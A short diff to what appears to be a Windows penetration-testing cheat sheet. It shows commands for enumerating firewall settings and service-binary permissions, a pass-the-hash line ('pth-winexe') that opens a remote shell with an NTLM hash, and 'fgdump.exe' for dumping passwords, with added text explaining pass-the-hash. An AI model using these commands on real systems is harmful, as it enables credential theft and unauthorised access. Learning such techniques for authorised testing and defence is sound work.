@@ -41,8 +41,8 @@ netsh firewall show config*
     *$ for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\windows\temp\permissions.txt
 $ for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a"*
 
-    Pass the hash
-    *$ pth-winexe -U hash //IP cmd*
+    Pass The Hash allows an attacker to authenticate to a remote target by using a valid combination of username and NTLM/LM hash rather than a cleartext password.
+    *$ pth-winexe -U hash //$ip cmd*
 
     Dump passwords
     *$ fgdump.exe*
